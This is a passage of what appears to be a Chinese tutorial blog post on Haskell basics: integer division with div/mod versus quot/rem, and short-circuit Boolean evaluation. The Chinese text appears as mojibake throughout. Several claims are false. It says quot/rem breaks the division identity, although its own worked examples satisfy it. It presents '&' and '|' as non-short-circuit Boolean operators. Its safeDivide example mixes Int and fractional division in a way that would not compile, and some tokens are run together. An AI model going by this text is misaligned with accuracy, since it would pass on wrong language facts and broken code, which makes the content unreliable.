                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Haskell åŸºç¡€è¿ç®—è¦†ç›–<strong>æ•°å€¼ã€å¸ƒå°”ã€å­—ç¬¦</strong>ä¸‰å¤§ç±»ï¼Œæ ¸å¿ƒè®¾è®¡åŸåˆ™æ˜¯<strong>å…¼é¡¾ç±»å‹å®‰å…¨ã€æ•°å­¦ä¸¥è°¨æ€§ã€æ‰§è¡Œæ•ˆç‡</strong>ï¼ŒåŒºåˆ«äºä¼ ç»Ÿç¼–ç¨‹è¯­è¨€çš„ã€Œå•ä¸€è§„åˆ™è®¾è®¡ã€ï¼Œå¯¹é«˜é¢‘æ˜“é”™çš„è¿ç®—åœºæ™¯åšäº†ç²¾ç»†åŒ–ä¼˜åŒ–ï¼Œæ‰€æœ‰ç‰¹æ€§å‡è´´åˆ Haskell æ ¸å¿ƒè®¾è®¡å“²å­¦ã€‚</p>
<h2 data-id="heading-0">1 æ•°å€¼è¿ç®—ï¼šdiv/mod ä¸ quot/rem çš„æ ¸å¿ƒå·®å¼‚</h2>
<p>Haskell å¹¶éæä¾›å•ä¸€æ•´é™¤/å–ä½™è§„åˆ™ï¼Œè€Œæ˜¯è®¾è®¡<strong>ä¸¤ç»„äº’è¡¥çš„è¿ç®—ç¬¦</strong>ï¼Œæ ¸å¿ƒè§£å†³ã€Œæ•°å­¦è®¡ç®—ä¸¥è°¨æ€§ã€ä¸ã€Œè®¡ç®—æœºä¼ ç»Ÿè®¡ç®—å…¼å®¹æ€§/æ•ˆç‡ã€çš„çŸ›ç›¾ï¼Œæ˜¯ Haskellã€Œæ•°å­¦æŠ½è±¡ä¼˜å…ˆã€è®¾è®¡å“²å­¦åœ¨åŸºç¡€è¿ç®—çš„ç›´æ¥ä½“ç°ï¼Œ<strong>è´Ÿæ•°è¿ç®—</strong>æ˜¯ä¸¤ç»„è¿ç®—ç¬¦çš„æ ¸å¿ƒåŒºåˆ†åœºæ™¯ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒè§„åˆ™ï¼šæœ¬è´¨æ˜¯ã€Œå–æ•´æ–¹å‘ã€çš„å·®å¼‚</h3>
<p>ä¸¤ç»„è¿ç®—ç¬¦çš„æ‰€æœ‰åŒºåˆ«å‡æºäº<strong>æ•´é™¤æ—¶çš„å–æ•´æ–¹å‘</strong>ï¼Œè¿™ç›´æ¥å†³å®šå–ä½™ç»“æœçš„ç¬¦å·ï¼Œä¸”ä»…æœ‰ä¸€ç»„æ»¡è¶³æ•°å­¦é€šç”¨æ’ç­‰å¼ï¼Œæ ¸å¿ƒè§„åˆ™å¯¹æ¯”å¦‚ä¸‹ï¼š</p>


























<table><thead><tr><th>è¿ç®—ç¬¦ç»„</th><th>å–æ•´æ–¹å‘</th><th>æ ¸å¿ƒæ’ç­‰å¼æ”¯æŒ</th><th>å–ä½™ç»“æœç¬¦å·</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>div/mod</td><td>å‘è´Ÿæ— ç©·å–æ•´</td><td>é€šç”¨æ”¯æŒï¼ˆæ‰€æœ‰æ•´æ•° x/yï¼Œyâ‰ 0ï¼‰</td><td>ä¸<strong>é™¤æ•° y</strong> ä¸€è‡´</td><td>æ•°å­¦å»ºæ¨¡ã€æ•°è®ºè®¡ç®—ã€é‡‘èé‡åŒ–</td></tr><tr><td>quot/rem</td><td>å‘é›¶å–æ•´</td><td>ä»…éè´Ÿæ•´æ•°æ”¯æŒ</td><td>ä¸<strong>è¢«é™¤æ•° x</strong> ä¸€è‡´</td><td>æ™®é€šæ•°å€¼è®¡ç®—ã€è·¨è¯­è¨€å…¼å®¹</td></tr></tbody></table>
<ul>
<li>æ ¸å¿ƒæ’ç­‰å¼ï¼š<code>x = æ•´é™¤ç»“æœ * y + å–ä½™ç»“æœ</code>ï¼Œè¿™æ˜¯æ•°è®ºä¸­æ•´é™¤/å–ä½™çš„æ ¸å¿ƒå®šä¹‰ï¼Œ<strong>div/mod æ— æ¡ä»¶æ»¡è¶³è¯¥æ’ç­‰å¼ï¼Œæ˜¯çœŸæ­£è´´åˆæ•°å­¦å®šä¹‰çš„å®ç°</strong>ï¼›</li>
<li>å–æ•´æ–¹å‘ç»†èŠ‚ï¼šæ­£æ•°è¿ç®—æ—¶ï¼Œã€Œå‘è´Ÿæ— ç©·å–æ•´ã€å’Œã€Œå‘é›¶å–æ•´ã€ç»“æœä¸€è‡´ï¼Œä»…<strong>è´Ÿæ•°å‚ä¸è¿ç®—æ—¶</strong>ï¼Œå–æ•´æ–¹å‘å·®å¼‚ä¼šå¯¼è‡´ç»“æœå®Œå…¨ä¸åŒã€‚</li>
</ul>
<h3 data-id="heading-2">ç¤ºä¾‹æ·±åº¦è§£æ</h3>
<pre><code class="hljs language-scss" lang="scss">-- æ­£æ•°è¿ç®—ï¼šä¸¤ç»„å–æ•´æ–¹å‘ä¸€è‡´ï¼Œç»“æœå®Œå…¨ç›¸åŒ
<span class="hljs-selector-tag">div</span> <span class="hljs-number">7</span> <span class="hljs-number">3</span>  -- <span class="hljs-number">7</span>Ã·<span class="hljs-number">3</span>=<span class="hljs-number">2.333</span> â†’ å‘è´Ÿæ— ç©·å–æ•´=<span class="hljs-number">2</span> â†’ mod <span class="hljs-number">7</span> <span class="hljs-number">3</span> =<span class="hljs-number">7</span>-<span class="hljs-number">2</span>*<span class="hljs-number">3</span>=<span class="hljs-number">1</span>
quot <span class="hljs-number">7</span> <span class="hljs-number">3</span> -- <span class="hljs-number">7</span>Ã·<span class="hljs-number">3</span>=<span class="hljs-number">2.333</span> â†’ å‘é›¶å–æ•´=<span class="hljs-number">2</span> â†’ rem <span class="hljs-number">7</span> <span class="hljs-number">3</span> =<span class="hljs-number">7</span>-<span class="hljs-number">2</span>*<span class="hljs-number">3</span>=<span class="hljs-number">1</span>

-- è´Ÿæ•°è¿ç®—ï¼šæ ¸å¿ƒåŒºåˆ†åœºæ™¯ï¼Œå–æ•´æ–¹å‘ä¸åŒå¯¼è‡´ç»“æœå·®å¼‚æ˜¾è‘—
<span class="hljs-selector-tag">div</span> (-<span class="hljs-number">7</span>) <span class="hljs-number">3</span>  -- -<span class="hljs-number">7</span>Ã·<span class="hljs-number">3</span>=-<span class="hljs-number">2.333</span> â†’ å‘è´Ÿæ— ç©·å–æ•´=-<span class="hljs-number">3</span> â†’ mod (-<span class="hljs-number">7</span>)<span class="hljs-number">3</span> =-<span class="hljs-number">7</span> - (-<span class="hljs-number">3</span>)*<span class="hljs-number">3</span>=<span class="hljs-number">2</span>ï¼ˆé™¤æ•°<span class="hljs-number">3</span>æ­£ï¼Œä½™æ•°<span class="hljs-number">2</span>æ­£ï¼Œæ’ç­‰å¼æˆç«‹ï¼‰
quot (-<span class="hljs-number">7</span>) <span class="hljs-number">3</span> -- -<span class="hljs-number">7</span>Ã·<span class="hljs-number">3</span>=-<span class="hljs-number">2.333</span> â†’ å‘é›¶å–æ•´=-<span class="hljs-number">2</span> â†’ rem (-<span class="hljs-number">7</span>)<span class="hljs-number">3</span> =-<span class="hljs-number">7</span> - (-<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>=-<span class="hljs-number">1</span>ï¼ˆè¢«é™¤æ•°-<span class="hljs-number">7</span>è´Ÿï¼Œä½™æ•°-<span class="hljs-number">1</span>è´Ÿï¼Œæ’ç­‰å¼å¤±æ•ˆï¼š-<span class="hljs-number">7</span>â‰ -<span class="hljs-number">2</span>*<span class="hljs-number">3</span>+(-<span class="hljs-number">1</span>)ï¼‰

<span class="hljs-selector-tag">div</span> <span class="hljs-number">7</span> (-<span class="hljs-number">3</span>)  -- <span class="hljs-number">7</span>Ã·(-<span class="hljs-number">3</span>)=-<span class="hljs-number">2.333</span> â†’ å‘è´Ÿæ— ç©·å–æ•´=-<span class="hljs-number">3</span> â†’ <span class="hljs-built_in">mod7</span>(-<span class="hljs-number">3</span>)=<span class="hljs-number">7</span> - (-<span class="hljs-number">3</span>)*(-<span class="hljs-number">3</span>)=-<span class="hljs-number">2</span>ï¼ˆé™¤æ•°-<span class="hljs-number">3</span>è´Ÿï¼Œä½™æ•°-<span class="hljs-number">2</span>è´Ÿï¼Œæ’ç­‰å¼æˆç«‹ï¼‰
quot7 (-<span class="hljs-number">3</span>)  --<span class="hljs-number">7</span>Ã·(-<span class="hljs-number">3</span>)=-<span class="hljs-number">2.333</span> â†’ å‘é›¶å–æ•´=-<span class="hljs-number">2</span> â†’ <span class="hljs-built_in">rem7</span>(-<span class="hljs-number">3</span>)=<span class="hljs-number">7</span> - (-<span class="hljs-number">2</span>)*(-<span class="hljs-number">3</span>)=<span class="hljs-number">1</span>ï¼ˆè¢«é™¤æ•°<span class="hljs-number">7</span>æ­£ï¼Œä½™æ•°<span class="hljs-number">1</span>æ­£ï¼Œæ’ç­‰å¼å¤±æ•ˆï¼š<span class="hljs-number">7</span>â‰ -<span class="hljs-number">2</span>*(-<span class="hljs-number">3</span>)+<span class="hljs-number">1</span>ï¼‰
</code></pre>
<p><strong>å…³é”®ç»“è®º</strong>ï¼šæ— éœ€è®°å¿†å¤æ‚è§„åˆ™ï¼Œåªéœ€è®°ä½ã€Œè´Ÿæ•°è¿ç®—ç”¨ div/mod ä¿ä¸¥è°¨ï¼Œæ™®é€šè¿ç®—ç”¨ quot/rem ææ•ˆç‡ã€ã€‚</p>
<h3 data-id="heading-3">è®¾è®¡åˆè¡·ï¼šè§£å†³ä¼ ç»Ÿç¼–ç¨‹è¯­è¨€çš„ã€Œå•ä¸€è§„åˆ™ç—›ç‚¹ã€</h3>
<p>ä¼ ç»Ÿç¼–ç¨‹è¯­è¨€ï¼ˆC/Java å‘é›¶å–æ•´ã€Python å‘è´Ÿæ— ç©·å–æ•´ï¼‰ä»…æä¾›<strong>å•ä¸€æ•´é™¤/å–ä½™è§„åˆ™</strong>ï¼Œå­˜åœ¨ä¸¤å¤§æ ¸å¿ƒé—®é¢˜ï¼š</p>
<ol>
<li>æ•°å­¦å»ºæ¨¡åœºæ™¯ä¸­ï¼Œå•ä¸€è§„åˆ™å¯èƒ½å¯¼è‡´<strong>æ’ç­‰å¼å¤±æ•ˆ</strong>ï¼Œå¼•å‘åº•å±‚è®¡ç®—é€»è¾‘é”™è¯¯ï¼ˆå¦‚é‡‘èé‡åŒ–ä¸­çš„åˆ©æ¯è®¡ç®—ã€æ•°è®ºä¸­çš„æ¨¡è¿ç®—ï¼‰ï¼›</li>
<li>è·¨è¯­è¨€å…¼å®¹å¼€å‘æ—¶ï¼Œå•ä¸€è§„åˆ™ä¸å…¶ä»–è¯­è¨€è®¡ç®—é€»è¾‘å†²çªï¼Œå¢åŠ ä»£ç é€‚é…æˆæœ¬ã€‚</li>
</ol>
<p>Haskell è®¾è®¡ä¸¤ç»„è¿ç®—ç¬¦ï¼Œæœ¬è´¨æ˜¯<strong>ä¸åšäºŒé€‰ä¸€çš„æŠ˜ä¸­ï¼Œè€Œæ˜¯åšå…¨è¦†ç›–çš„é€‚é…</strong>ï¼šè®© div/mod è´´åˆæ•°å­¦æ•°è®ºå®šä¹‰ä¿éšœä¸¥è°¨æ€§ï¼Œè®© quot/rem å…¼å®¹ä¼ ç»Ÿè®¡ç®—æœºå–æ•´è§„åˆ™ä¿éšœæ•ˆç‡å’Œå…¼å®¹æ€§ã€‚</p>
<h3 data-id="heading-4">è®¾è®¡å¥½å¤„ï¼šç²¾å‡†é€‚é…ä¸åŒåœºæ™¯ï¼Œå…¼é¡¾ä¸¥è°¨ä¸å®ç”¨</h3>
<ol>
<li><strong>æ•°å­¦åœºæ™¯æ— é€»è¾‘é”™è¯¯</strong>ï¼šæ•°è®ºè®¡ç®—ã€æ•°å­¦å»ºæ¨¡ç­‰å¯¹ä¸¥è°¨æ€§è¦æ±‚é«˜çš„åœºæ™¯ï¼Œä½¿ç”¨ div/mod å¯ç¡®ä¿æ’ç­‰å¼å§‹ç»ˆæˆç«‹ï¼Œä»æ ¹æºé¿å…å› å–æ•´è§„åˆ™å¯¼è‡´çš„è®¡ç®—é”™è¯¯ï¼›</li>
<li><strong>æ™®é€šåœºæ™¯æ‰§è¡Œæ•ˆç‡æ›´é«˜</strong>ï¼šå‘é›¶å–æ•´çš„ç¡¬ä»¶å®ç°æ›´ç®€å•ï¼ˆCPU åŸç”ŸæŒ‡ä»¤æ”¯æŒï¼‰ï¼Œquot/rem æ‰§è¡Œæ•ˆç‡æ›´é«˜ï¼Œä¸”ä¸ C/Java ç­‰ä¸»æµè¯­è¨€é€»è¾‘ä¸€è‡´ï¼Œé™ä½è·¨è¯­è¨€é€‚é…æˆæœ¬ï¼›</li>
<li><strong>å¼€å‘è€…è‡ªä¸»é€‰æ‹©</strong>ï¼šæ— éœ€è¢«è¿«æ¥å—å•ä¸€è§„åˆ™çš„ç¼ºé™·ï¼Œå¯æ ¹æ®ä¸šåŠ¡åœºæ™¯ç²¾å‡†é€‰æ‹©è¿ç®—ç¬¦ï¼Œè®©åŸºç¡€è¿ç®—æ—¢è´´åˆç†è®ºåˆè½åœ°å·¥ç¨‹ã€‚</li>
</ol>
<h2 data-id="heading-5">2 å¸ƒå°”çŸ­è·¯æ±‚å€¼</h2>
<p>å¸ƒå°”çŸ­è·¯æ±‚å€¼æ˜¯æŒ‡<strong>é€»è¾‘ä¸ï¼ˆ&amp;&amp;ï¼‰ã€é€»è¾‘æˆ–ï¼ˆ||ï¼‰</strong> åœ¨è®¡ç®—æ—¶ï¼Œè‹¥ç¬¬ä¸€ä¸ªæ“ä½œæ•°å·²èƒ½ç¡®å®šæ•´ä¸ªè¡¨è¾¾å¼ç»“æœï¼Œ<strong>ç¬¬äºŒä¸ªæ“ä½œæ•°å°†è¢«å®Œå…¨è·³è¿‡ã€ä¸è¿›è¡Œä»»ä½•æ±‚å€¼</strong>ï¼Œæ˜¯ Haskellã€Œæƒ°æ€§æ±‚å€¼ã€æ ¸å¿ƒè®¾è®¡å“²å­¦åœ¨å¸ƒå°”è¿ç®—çš„ç›´æ¥è½åœ°ï¼Œä¹Ÿæ˜¯ä¿éšœä»£ç å®‰å…¨æ€§å’Œæ•ˆç‡çš„å…³é”®ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-6">æ ¸å¿ƒè§„åˆ™ï¼šçŸ­è·¯ä¸éçŸ­è·¯çš„æ˜ç¡®åŒºåˆ†</h3>
<p>Haskell æä¾›<strong>çŸ­è·¯</strong>å’Œ<strong>éçŸ­è·¯</strong>ä¸¤ç»„å¸ƒå°”è¿ç®—ç¬¦ï¼ŒåŠŸèƒ½ä¸€è‡´ä½†æ±‚å€¼ç­–ç•¥å®Œå…¨ä¸åŒï¼Œæ ¸å¿ƒè§„åˆ™å¦‚ä¸‹ï¼š</p>
<ol>
<li>
<p><strong>çŸ­è·¯è¿ç®—ç¬¦ï¼ˆé»˜è®¤/å¸¸ç”¨ï¼‰</strong> ï¼š<code>&amp;&amp;</code>ï¼ˆé€»è¾‘ä¸ï¼‰ã€<code>||</code>ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼Œéµå¾ªã€ŒæŒ‰éœ€æ±‚å€¼ã€ï¼š</p>
<ol>
<li><code>&amp;&amp;</code>ï¼šä»…ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸º <code>True</code> æ—¶ï¼Œæ‰æ±‚å€¼ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼ˆFalse &amp;&amp; ä»»æ„å€¼ = Falseï¼‰ï¼›</li>
<li><code>||</code>ï¼šä»…ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸º <code>False</code> æ—¶ï¼Œæ‰æ±‚å€¼ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼ˆTrue || ä»»æ„å€¼ = Trueï¼‰ã€‚</li>
</ol>
</li>
<li>
<p><strong>éçŸ­è·¯è¿ç®—ç¬¦ï¼ˆæå°‘ä½¿ç”¨ï¼‰</strong> ï¼š<code>&amp;</code>ï¼ˆé€»è¾‘ä¸ï¼‰ã€<code>|</code>ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼Œ<strong>å¼ºåˆ¶æ±‚å€¼ä¸¤ä¸ªæ“ä½œæ•°</strong>ï¼Œæ— è®ºç¬¬ä¸€ä¸ªæ“ä½œæ•°ç»“æœå¦‚ä½•ï¼Œé€‚åˆéœ€è¦ã€Œä¸¤ä¸ªæ“ä½œæ•°éƒ½æ‰§è¡Œï¼ˆå«IOå‰¯ä½œç”¨ï¼‰ã€çš„ç‰¹æ®Šåœºæ™¯ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¿ƒå‰æ</strong>ï¼šHaskell ä¸­ <code>error "xxx"</code>ã€<code>undefined</code> ç­‰æ˜¯<strong>æ±‚å€¼æ—¶è§¦å‘çš„è¿è¡Œæ—¶é”™è¯¯</strong>ï¼Œè‹¥è¡¨è¾¾å¼æœªè¢«æ±‚å€¼ï¼Œé”™è¯¯ä¸ä¼šè§¦å‘ï¼ˆè¿™æ˜¯ç¤ºä¾‹èƒ½ä½“ç°çŸ­è·¯æ•ˆæœçš„å…³é”®ï¼‰ã€‚</p>
</li>
</ol>
<h3 data-id="heading-7">ç¤ºä¾‹æ·±åº¦è§£æ</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">-- ç¤ºä¾‹<span class="hljs-number">1</span>ï¼š&amp;&amp; çŸ­è·¯â€”â€”ç¬¬ä¸€ä¸ªæ“ä½œæ•°<span class="hljs-literal">False</span>ï¼Œç›´æ¥è¿”å›<span class="hljs-literal">False</span>ï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°ï¼ˆ<span class="hljs-keyword">error</span>ï¼‰ä¸æ±‚å€¼
<span class="hljs-literal">False</span> &amp;&amp; <span class="hljs-keyword">error</span> <span class="hljs-string">"æ‰§è¡Œäº†"</span>  -- ç»“æœï¼š<span class="hljs-literal">False</span>ï¼Œæ— æŠ¥é”™ï¼ˆé€»è¾‘ï¼š<span class="hljs-literal">False</span>èƒ½ç¡®å®šæœ€ç»ˆç»“æœï¼Œæ— éœ€æ±‚å€¼ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰

-- ç¤ºä¾‹<span class="hljs-number">2</span>ï¼š|| çŸ­è·¯â€”â€”ç¬¬ä¸€ä¸ªæ“ä½œæ•°<span class="hljs-literal">True</span>ï¼Œç›´æ¥è¿”å›<span class="hljs-literal">True</span>ï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°ï¼ˆ<span class="hljs-keyword">error</span>ï¼‰ä¸æ±‚å€¼
<span class="hljs-literal">True</span> || <span class="hljs-keyword">error</span> <span class="hljs-string">"æ‰§è¡Œäº†"</span>   -- ç»“æœï¼š<span class="hljs-literal">True</span>ï¼Œæ— æŠ¥é”™ï¼ˆé€»è¾‘ï¼š<span class="hljs-literal">True</span>èƒ½ç¡®å®šæœ€ç»ˆç»“æœï¼Œæ— éœ€æ±‚å€¼ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰

-- ç¤ºä¾‹<span class="hljs-number">3</span>ï¼šéçŸ­è·¯&amp;â€”â€”å¼ºåˆ¶æ±‚å€¼ä¸¤ä¸ªæ“ä½œæ•°ï¼Œè§¦å‘è¿è¡Œæ—¶é”™è¯¯
<span class="hljs-literal">False</span> &amp; <span class="hljs-keyword">error</span> <span class="hljs-string">"æ‰§è¡Œäº†"</span>   -- ç»“æœï¼š*** Exception: æ‰§è¡Œäº†ï¼ˆé€»è¾‘ï¼šæ— è®ºç¬¬ä¸€ä¸ªæ“ä½œæ•°ç»“æœå¦‚ä½•ï¼Œéƒ½æ±‚å€¼ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰

-- å®ç”¨å»¶ä¼¸ï¼šçŸ­è·¯æ±‚å€¼çš„æ ¸å¿ƒä»·å€¼â€”â€”å®‰å…¨çš„æ¡ä»¶æ ¡éªŒï¼ˆé¿å…è¿è¡Œæ—¶é”™è¯¯ï¼‰
safeDivide :: Int -&gt; Int -&gt; Bool
safeDivide x y = y /= <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-number">10</span> / fromIntegral y &gt; x
-- é€»è¾‘ï¼šè‹¥y=<span class="hljs-number">0</span>ï¼Œç¬¬ä¸€ä¸ªæ“ä½œæ•°y/=<span class="hljs-number">0</span>ä¸º<span class="hljs-literal">False</span>ï¼Œ&amp;&amp;çŸ­è·¯ï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°<span class="hljs-number">10</span>/yä¸ä¼šæ±‚å€¼ï¼Œé¿å…é™¤é›¶é”™è¯¯ï¼›è‹¥yâ‰ <span class="hljs-number">0</span>ï¼Œæ‰æ‰§è¡Œåç»­åˆ¤æ–­
</code></pre>
<p><strong>å…³é”®ç»“è®º</strong>ï¼šçŸ­è·¯æ±‚å€¼çš„æ ¸å¿ƒç”¨é€”æ˜¯ã€Œ<strong>å…ˆæ ¡éªŒï¼Œåæ‰§è¡Œ</strong>ã€ï¼Œå°†å®‰å…¨æ ¡éªŒæ”¾åœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œå±é™©/è€—æ—¶æ“ä½œæ”¾åœ¨ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼Œæ—¢å®‰å…¨åˆé«˜æ•ˆã€‚</p>
<h3 data-id="heading-8">è®¾è®¡åˆè¡·ï¼šè´´åˆæƒ°æ€§æ±‚å€¼ï¼Œè§£å†³å®é™…å¼€å‘é—®é¢˜</h3>
<ol>
<li><strong>è½åœ°æƒ°æ€§æ±‚å€¼å“²å­¦</strong>ï¼šHaskell æ ¸å¿ƒè®¾è®¡ä¹‹ä¸€æ˜¯ã€Œä¸æ±‚å€¼ç›´åˆ°è¢«éœ€è¦ã€ï¼ŒçŸ­è·¯æ±‚å€¼æ­£æ˜¯è¿™ä¸€æ€æƒ³çš„å…·ä½“ä½“ç°â€”â€”ç¬¬äºŒä¸ªæ“ä½œæ•°çš„ç»“æœã€Œä¸è¢«éœ€è¦ã€æ—¶ï¼Œå°±ä¸ä¼šè¢«æ±‚å€¼ï¼Œä¸è¯­è¨€æ•´ä½“è®¾è®¡ä¿æŒä¸€è‡´ï¼›</li>
<li><strong>å‡å°‘æ— æ•ˆè®¡ç®—å¼€é”€</strong>ï¼šè‹¥ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯å¤§è®¡ç®—é‡ã€é«˜è€—æ—¶æ“ä½œï¼ˆå¦‚å¤æ‚å¾ªç¯ã€IOæ“ä½œã€è¿œç¨‹è°ƒç”¨ï¼‰ï¼ŒçŸ­è·¯æ±‚å€¼å¯è·³è¿‡è¿™äº›æ— æ•ˆæ“ä½œï¼Œæ˜¾è‘—æå‡ç¨‹åºæ‰§è¡Œæ•ˆç‡ï¼›</li>
<li><strong>åŸç”Ÿæ”¯æŒå®‰å…¨æ¡ä»¶åˆ¤æ–­</strong>ï¼šæ— éœ€é¢å¤–ç¼–å†™ if è¯­å¥ï¼Œç›´æ¥é€šè¿‡å¸ƒå°”è¡¨è¾¾å¼å®ç°ã€Œæ ¡éªŒ+é€»è¾‘ã€çš„ç»„åˆï¼Œè´´åˆ Haskell å£°æ˜å¼ç¼–ç¨‹é£æ ¼ï¼Œè®©ä»£ç æ›´ç®€æ´ã€‚</li>
</ol>
<h3 data-id="heading-9">è®¾è®¡å¥½å¤„ï¼šæ•ˆç‡ã€å®‰å…¨ã€ç›´è§‰ä¸‰é‡ä¿éšœ</h3>
<ol>
<li><strong>æå‡æ‰§è¡Œæ•ˆç‡</strong>ï¼šè·³è¿‡æ— éœ€æ±‚å€¼çš„æ“ä½œæ•°ï¼Œå°¤å…¶å¯¹é«˜è€—æ—¶æ“ä½œï¼ˆå¦‚IOã€å¤æ‚è®¡ç®—ï¼‰ï¼Œèƒ½æœ‰æ•ˆå‡å°‘ç¨‹åºè¿è¡Œæ—¶é—´ï¼Œæ˜¯æƒ°æ€§æ±‚å€¼åœ¨åŸºç¡€è¿ç®—ä¸­çš„ç›´æ¥æ€§èƒ½æ”¶ç›Šï¼›</li>
<li><strong>å¢å¼ºä»£ç å®‰å…¨æ€§</strong>ï¼šä»è¯­æ³•å±‚é¢é¿å…é™¤é›¶é”™è¯¯ã€ç´¢å¼•è¶Šç•Œã€ç©ºæŒ‡é’ˆï¼ˆåç»­å­¦ä¹ Maybeç±»å‹åå¯æ‹“å±•ï¼‰ç­‰å¸¸è§è¿è¡Œæ—¶é”™è¯¯ï¼Œè®©åŸºç¡€è¿ç®—æ›´å¥å£®ï¼›</li>
<li><strong>ç¬¦åˆå¼€å‘è€…ç›´è§‰</strong>ï¼šä¸æ•°å­¦ä¸­çš„é€»è¾‘æ¨ç†è§„åˆ™å®Œå…¨ä¸€è‡´â€”â€”æ•°å­¦ä¸­ã€Œå‡å‘½é¢˜è•´å«ä»»æ„å‘½é¢˜ã€ã€ŒçœŸå‘½é¢˜è¢«ä»»æ„å‘½é¢˜è•´å«ã€ï¼ŒçŸ­è·¯æ±‚å€¼çš„é€»è¾‘ä¸è¿™ä¸€æ•°å­¦ç›´è§‰åŒ¹é…ï¼Œé™ä½ç†è§£å’Œä½¿ç”¨æˆæœ¬ï¼›</li>
